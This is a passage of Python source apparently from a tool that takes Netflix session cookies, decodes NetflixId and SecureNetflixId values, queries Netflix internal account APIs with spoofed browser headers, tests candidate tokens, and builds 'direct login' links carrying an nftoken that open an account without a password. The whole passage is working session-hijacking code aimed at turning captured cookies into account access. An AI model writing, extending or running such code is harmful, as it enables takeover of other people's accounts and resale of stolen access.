                                    nftoken_match = re.search(pattern, decoded_value)
                                    if nftoken_match:
                                        nftoken = nftoken_match.group(1)
                                        logger.info(f"✅ Found nftoken in SecureNetflixId cookie: {nftoken[:20]}...")
                                        await browser.close()
                                        return nftoken
                            except Exception as e:
                                logger.warning(f"Error decoding SecureNetflixId cookie: {e}")
                                continue
                                
                except Exception as e:
                    logger.warning(f"Error extracting from cookies: {e}")
                
                # Method 5: Try to generate nftoken by accessing account page with specific parameters
                logger.info("🔍 Method 5: Trying to generate nftoken...")
                try:
                    # Try accessing account page with different parameters
                    test_urls = [
                        "https://www.netflix.com/account?nftoken=test",
                        "https://www.netflix.com/account?redirect=account",
                        "https://www.netflix.com/account?action=view"
                    ]
                    
                    for test_url in test_urls:
                        try:
                            logger.info(f"🔍 Testing URL: {test_url}")
                            await page.goto(test_url, wait_until="networkidle", timeout=TIMEOUT)
                            await page.wait_for_timeout(2000)
                            
                            current_url = page.url
                            logger.info(f"📍 URL after test: {current_url}")
                            
                            if "nftoken=" in current_url:
                                nftoken_match = re.search(r'nftoken=([^&]+)', current_url)
                                if nftoken_match:
                                    nftoken = nftoken_match.group(1)
                                    logger.info(f"✅ Found nftoken after test: {nftoken[:20]}...")
                                    await browser.close()
                                    return nftoken
                        except Exception as e:
                            logger.warning(f"Error testing URL {test_url}: {e}")
                            continue
                            
                except Exception as e:
                    logger.warning(f"Error in nftoken generation test: {e}")
                
                logger.warning("⚠️ All methods failed to extract nftoken")
                await browser.close()
                return None
                
            except Exception as e:
                logger.error(f"Error in extract_nftoken: {e}")
                await browser.close()
                return None
                
    except Exception as e:
        logger.error(f"Error in extract_nftoken: {e}")
        return None

async def generate_fallback_nftoken(cookies: List[Dict]) -> Optional[str]:
    """Generate a fallback nftoken by making API requests to Netflix.
    
    This method tries to get nftoken by making requests to Netflix's internal APIs.
    """
    try:
        import requests
        import json
        import time
        
        # Convert cookies to requests format
        cookie_dict = {}
        for cookie in cookies:
            cookie_dict[cookie['name']] = cookie['value']
        
        # Create session with cookies
        session = requests.Session()
        session.cookies.update(cookie_dict)
        
        # Set headers to mimic browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Referer': 'https://www.netflix.com/account'
        }
        
        # Try to get nftoken from Netflix API
        api_urls = [
            'https://www.netflix.com/api/shakti/v4/account',
            'https://www.netflix.com/api/shakti/v4/account/membership',
            'https://www.netflix.com/api/shakti/v4/account/security',
            'https://www.netflix.com/api/shakti/v4/account/profiles'
        ]
        
        for api_url in api_urls:
            try:
                logger.info(f"🔍 Trying API: {api_url}")
                response = session.get(api_url, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    # Check if response contains nftoken
                    response_text = response.text
                    if 'nftoken' in response_text:
                        # Try to extract nftoken from JSON response
                        try:
                            data = response.json()
                            if isinstance(data, dict):
                                # Look for nftoken in various possible keys
                                for key in ['nftoken', 'token', 'authToken', 'accessToken']:
                                    if key in data:
                                        nftoken = data[key]
                                        if isinstance(nftoken, str) and len(nftoken) > 10:
                                            logger.info(f"✅ Found nftoken in API response: {nftoken[:20]}...")
                                            return nftoken
                        except json.JSONDecodeError:
                            # Try regex extraction from text
                            nftoken_match = re.search(r'"nftoken":\s*"([^"]+)"', response_text)
                            if nftoken_match:
                                nftoken = nftoken_match.group(1)
                                logger.info(f"✅ Found nftoken via regex: {nftoken[:20]}...")
                                return nftoken
                
                time.sleep(1)  # Small delay between requests
                
            except Exception as e:
                logger.warning(f"Error accessing API {api_url}: {e}")
                continue
        
        # Try to generate nftoken by making a request to account page
        try:
            logger.info("🔍 Trying to generate nftoken via account page request...")
            response = session.get('https://www.netflix.com/account', headers=headers, timeout=10)
            
            if response.status_code == 200:
                # Check if URL redirect contains nftoken
                final_url = response.url
                if 'nftoken=' in final_url:
                    nftoken_match = re.search(r'nftoken=([^&]+)', final_url)
                    if nftoken_match:
                        nftoken = nftoken_match.group(1)
                        logger.info(f"✅ Found nftoken in redirect URL: {nftoken[:20]}...")
                        return nftoken
                
                # Check response headers for nftoken
                for header_name, header_value in response.headers.items():
                    if 'nftoken' in header_value.lower():
                        nftoken_match = re.search(r'nftoken[=:]([A-Za-z0-9+/=]+)', header_value)
                        if nftoken_match:
                            nftoken = nftoken_match.group(1)
                            logger.info(f"✅ Found nftoken in header {header_name}: {nftoken[:20]}...")
                            return nftoken
                            
        except Exception as e:
            logger.warning(f"Error in account page request: {e}")
        
        logger.warning("⚠️ Fallback nftoken generation failed")
        return None
        
    except Exception as e:
        logger.error(f"Error in generate_fallback_nftoken: {e}")
        return None

async def find_working_nftoken(cookies: List[Dict]) -> Optional[str]:
    """Find a working nftoken by testing different token combinations from cookies.
    
    Args:
        cookies: Original cookies for session
        
    Returns:
        Working nftoken or None
    """
    try:
        import requests
        import urllib.parse
        import re
        
        # Convert cookies to requests format
        cookie_dict = {}
        for cookie in cookies:
            cookie_dict[cookie['name']] = cookie['value']
        
        # Create session with cookies
        session = requests.Session()
        session.cookies.update(cookie_dict)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        }
        
        # Extract potential tokens from NetflixId cookie
        netflix_id_cookie = cookie_dict.get('NetflixId', '')
        if netflix_id_cookie:
            decoded_value = urllib.parse.unquote(netflix_id_cookie)
            logger.info(f"🔍 Searching for working nftoken in: {decoded_value[:100]}...")
            
            # Look for different token patterns
            token_patterns = [
                r'ct=([A-Za-z0-9+/=]+)',  # ct parameter
                r'pg=([A-Za-z0-9+/=]+)',  # pg parameter  
                r'ch=([A-Za-z0-9+/=]+)',  # ch parameter
                r'([A-Za-z0-9+/=]{100,})',  # Any long token
                r'([A-Za-z0-9+/=]{50,})',   # Any medium token
            ]
            
            for pattern in token_patterns:
                matches = re.findall(pattern, decoded_value)
                for token in matches:
                    if len(token) > 30:  # Minimum token length
                        logger.info(f"🔍 Testing token: {token[:20]}...")
                        
                        # Test this token
                        encoded_token = urllib.parse.quote(token, safe='')
                        test_link = f"https://www.netflix.com/account?nftoken={encoded_token}"
                        
                        try:
                            response = session.get(test_link, headers=headers, timeout=5, allow_redirects=True)
                            if response.status_code == 200:
                                final_url = response.url
                                if '/account' in final_url and '/login' not in final_url:
                                    logger.info(f"✅ Found working nftoken: {token[:20]}...")
                                    return token
                        except Exception:
                            continue
        
        # Try SecureNetflixId cookie
        secure_netflix_id_cookie = cookie_dict.get('SecureNetflixId', '')
        if secure_netflix_id_cookie:
            decoded_value = urllib.parse.unquote(secure_netflix_id_cookie)
            logger.info(f"🔍 Searching SecureNetflixId: {decoded_value[:100]}...")
            
            # Look for tokens in SecureNetflixId
            token_patterns = [
                r'mac=([A-Za-z0-9+/=]+)',  # mac parameter
                r'([A-Za-z0-9+/=]{50,})',   # Any medium+ token
            ]
            
            for pattern in token_patterns:
                matches = re.findall(pattern, decoded_value)
                for token in matches:
                    if len(token) > 30:
                        logger.info(f"🔍 Testing SecureNetflixId token: {token[:20]}...")
                        
                        encoded_token = urllib.parse.quote(token, safe='')
                        test_link = f"https://www.netflix.com/account?nftoken={encoded_token}"
                        
                        try:
                            response = session.get(test_link, headers=headers, timeout=5, allow_redirects=True)
                            if response.status_code == 200:
                                final_url = response.url
                                if '/account' in final_url and '/login' not in final_url:
                                    logger.info(f"✅ Found working SecureNetflixId nftoken: {token[:20]}...")
                                    return token
                        except Exception:
                            continue
        
        logger.warning("⚠️ No working nftoken found in cookies")
        return None
        
    except Exception as e:
        logger.error(f"Error in find_working_nftoken: {e}")
        return None

async def validate_nftoken_link(nftoken: str, cookies: List[Dict]) -> bool:
    """Validate if the nftoken link actually works by testing it.
    
    Args:
        nftoken: The Netflix token to test
        cookies: Original cookies for session
        
    Returns:
        True if link works, False otherwise
    """
    try:
        import requests
        import urllib.parse
        
        # Convert cookies to requests format
        cookie_dict = {}
        for cookie in cookies:
            cookie_dict[cookie['name']] = cookie['value']
        
        # Create session with cookies
        session = requests.Session()
        session.cookies.update(cookie_dict)
        
        # Generate the link
        encoded_token = urllib.parse.quote(nftoken, safe='')
        test_link = f"https://www.netflix.com/account?nftoken={encoded_token}"
        
        # Test the link
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        }
        
        logger.info(f"🔍 Testing nftoken link: {test_link[:50]}...")
        response = session.get(test_link, headers=headers, timeout=10, allow_redirects=True)
        
        if response.status_code == 200:
            final_url = response.url
            logger.info(f"📍 Test result URL: {final_url}")
            
            # Check if we're on account page (not login page)
            if '/account' in final_url and '/login' not in final_url:
                logger.info("✅ NFToken link validation: SUCCESS - Direct access to account page")
                return True
            else:
                logger.warning("❌ NFToken link validation: FAILED - Redirected to login or other page")
                return False
        else:
            logger.warning(f"❌ NFToken link validation: FAILED - HTTP {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"❌ NFToken link validation error: {e}")
        return False

def generate_direct_login_link(nftoken: str) -> str:
    """Generate direct login link using nftoken.
    
    Args:
        nftoken: The Netflix token extracted from account
        
    Returns:
        Direct login URL
    """
    if not nftoken:
        return "N/A"
    
    # URL encode the nftoken to ensure it's properly formatted
    import urllib.parse
    encoded_token = urllib.parse.quote(nftoken, safe='')
    
    direct_link = f"https://www.netflix.com/account?nftoken={encoded_token}"
    return direct_link